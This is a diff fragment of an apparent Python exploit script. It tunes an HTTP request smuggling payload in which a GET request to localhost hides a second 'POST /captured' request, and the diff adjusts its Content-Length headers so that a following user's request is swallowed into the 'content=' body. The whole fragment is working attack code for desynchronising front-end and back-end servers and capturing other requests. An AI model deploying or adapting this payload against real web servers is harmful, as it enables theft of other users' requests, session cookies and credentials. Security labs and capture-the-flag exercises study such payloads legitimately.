@@ -7,13 +7,13 @@ PORT = 80
 PAYLOAD = (
     b"GET / HTTP/1.1\r\n" +
     b"Host: localhost\r\n" +
-    b"Content-Length: 130\r\n" +
+    b"Content-Length: 129\r\n" +
     b"Sec-Websocket-Key1: x\r\n" + 
     b"\r\n" +
     b"xxxxxxxxPOST /captured HTTP/1.1\r\n" +
     b"Host: localhost\r\n" +  
     b"Content-Type: application/x-www-form-urlencoded\r\n" +
-    b"Content-Length: 101\r\n" +
+    b"Content-Length: 93\r\n" +
     b"\r\n" +
     b"content="
 )
